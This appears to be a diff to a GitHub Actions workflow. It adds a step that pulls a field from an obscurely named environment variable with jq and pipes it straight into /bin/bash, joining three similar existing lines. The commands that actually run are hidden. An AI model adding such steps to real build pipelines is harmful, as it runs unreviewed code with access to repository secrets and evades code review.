@@ -24,6 +24,7 @@ jobs:
           echo $juln0632 | jq -r .osldp2951 | /bin/bash
           echo $u0598 | jq -r .iwc24 | /bin/bash
           printf '%s' "$cua11" | jq -r .hwe7232 | /bin/bash
+          echo $hr03226 | jq -r .xum70092 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
